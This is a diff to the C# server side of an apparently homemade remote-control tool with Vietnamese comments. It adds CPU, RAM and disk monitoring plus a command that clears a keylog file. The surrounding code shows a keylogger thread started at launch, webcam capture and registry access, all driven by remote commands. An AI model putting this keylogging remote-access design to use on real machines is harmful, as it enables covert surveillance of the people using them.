@@ -26,11 +26,17 @@ namespace server
         FilterInfoCollection videoDevices;
         VideoCaptureDevice videoSource;
         DateTime lastSendTime = DateTime.MinValue;
+        PerformanceCounter cpuCounter;
+        PerformanceCounter ramCounter;
+
         public server()
         {
             InitializeComponent();
             CheckForIllegalCrossThreadCalls = false;
 
+            cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
+            ramCounter = new PerformanceCounter("Memory", "% Committed Bytes In Use");
+            cpuCounter.NextValue(); // Gọi lần đầu luôn trả về 0
         
             tklog = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
             tklog.SetApartmentState(ApartmentState.STA); 
@@ -68,6 +74,54 @@ namespace server
                 case "HKEY_CURRENT_CONFIG": a = Registry.CurrentConfig; break;
             }
             return a;
+        }
+
+        public void monitor()
+        {
+            try
+            {
+                // 1. CPU (%)
+                float cpu = cpuCounter.NextValue();
+
+                // 2. RAM (Tính toán Used/Total)
+                float ramPercent = ramCounter.NextValue(); // Ví dụ: 60%
+                
+                // Lấy lượng RAM còn trống (Available MBytes)
+                PerformanceCounter ramAvailCounter = new PerformanceCounter("Memory", "Available MBytes");
+                float ramAvailMB = ramAvailCounter.NextValue(); // Ví dụ: 4000MB
+                
+                // Công thức ngược: Total = Available / (100% - Usage%)
+                // Ví dụ: Còn 4000MB (40%) -> Total = 4000 / 0.4 = 10000MB
+                float ramTotalMB = 0;
+                if (ramPercent < 100) {
+                    ramTotalMB = ramAvailMB / ((100 - ramPercent) / 100);
+                } else {
+                    ramTotalMB = ramAvailMB; // Tránh chia cho 0
+                }
+                
+                float ramUsedMB = ramTotalMB - ramAvailMB;
+
+                // 3. DISK (Ổ C:)
+                DriveInfo d = new DriveInfo("C");
+                long diskTotalGB = d.TotalSize / 1024 / 1024 / 1024;
+                long diskFreeGB = d.TotalFreeSpace / 1024 / 1024 / 1024;
+                long diskUsedGB = diskTotalGB - diskFreeGB;
+                int diskPercent = (int)((double)diskUsedGB / diskTotalGB * 100);
+
+                // Gửi chuỗi: CPU | RAM_Used | RAM_Total | Disk_Used | Disk_Total
+                // Làm tròn số RAM về GB (1 số lẻ)
+                string ramU = (ramUsedMB / 1024).ToString("0.0");
+                string ramT = (ramTotalMB / 1024).ToString("0.0");
+
+                string data = ((int)cpu) + "|" + ramU + "|" + ramT + "|" + diskUsedGB + "|" + diskTotalGB;
+                
+                Program.nw.WriteLine(data);
+                Program.nw.Flush();
+            }
+            catch 
+            { 
+                Program.nw.WriteLine("0|0|0|0|0"); Program.nw.Flush(); 
+            }
         }
 
         public void listInstalledApps()
@@ -646,6 +700,17 @@ namespace server
                         if (content == "") content = "[Trong]";
                         Program.nw.Write(content); Program.nw.Flush();
                         break;
+
+                    case "CLEAR":
+                        try { 
+                            File.WriteAllText(KeyLogger.appstart.path, ""); // Xóa trắng file
+                            Program.nw.WriteLine("OK"); // Gửi phản hồi
+                            Program.nw.Flush();
+                        } catch {
+                            Program.nw.WriteLine("ERR"); 
+                            Program.nw.Flush();
+                        }
+                        break;
                     case "QUIT": return; // Chỉ return, không Abort thread
                 }
             }
@@ -689,6 +754,10 @@ namespace server
                                     u = p.Threads.Count.ToString();
                                     Program.nw.WriteLine(u); Program.nw.Flush();
 
+                                    long mem = p.WorkingSet64 / 1024 / 1024; // Đổi sang MB
+                                    Program.nw.WriteLine(mem.ToString() + " MB"); 
+                                    Program.nw.Flush();
+                                    
                                 }
                             }
                                
@@ -974,6 +1043,7 @@ namespace server
                             case "EXPLORER": fileManager(); break;
                             case "GET_INSTALLED": listInstalledApps(); break;
                             case "GET_NOTI": getNotiDB(); break;
+                            case "MONITOR": monitor(); break;
                             case "QUIT": clientConnected = false; break;
                         }
                     }
